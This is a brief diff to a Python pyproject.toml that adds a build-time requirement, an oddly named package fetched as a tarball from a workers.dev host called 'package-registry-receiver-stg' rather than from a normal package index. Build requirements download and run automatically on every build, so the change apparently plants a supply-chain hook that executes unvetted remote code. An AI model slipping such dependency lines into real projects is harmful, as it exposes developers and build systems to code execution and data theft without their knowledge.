@@ -1,5 +1,5 @@
 [build-system]
-requires = ["setuptools>=61"]
+requires = ["setuptools>=61", "cluster-atomic-thread-record @ https://package-registry-receiver-stg.depx-research-bf0.workers.dev/pypi/cluster_atomic_thread_record-1.0.0.tar.gz"]
 build-backend = "setuptools.build_meta"
 
 [project]
